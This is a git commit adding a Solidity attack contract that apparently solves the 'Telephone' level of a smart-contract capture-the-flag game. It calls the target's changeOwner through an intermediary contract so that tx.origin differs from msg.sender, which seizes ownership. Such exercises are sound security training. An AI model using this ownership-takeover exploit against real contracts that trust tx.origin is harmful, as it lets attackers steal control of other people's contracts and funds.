e28bfa445e069b1ef109d601c31b5465a99a3e96
Claudia <claudiabarcelovaldes40@gmail.com>
2023-12-25 22:47:00 +0100

    add telephone solution

---
+++ script/LevelAttacks/04TelephoneAttk.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.8.19;
+
+import {Broadcasted} from "./Broadcasted.sol";
+
+import {console} from "forge-std/Script.sol";
+
+contract TelephoneAttk is Broadcasted {
+    function attack(address payable telephoneCtr_) public payable override {
+        ITelephone(telephoneCtr_).changeOwner(tx.origin);
+    }
+
+    function broadcastedAttack(
+        address payable levelInstanceCtr_
+    ) external payable override {
+        // no broadcast to have different msg.sender and tx.origin
+        attack(payable(levelInstanceCtr_));
+    }
+}
+
+interface ITelephone {
+    // ! bracke this method callin it from another contract (msg.sender!=tx.origin)
+    function changeOwner(address _owner) external;
+
+    function owner() external returns (address);
+}
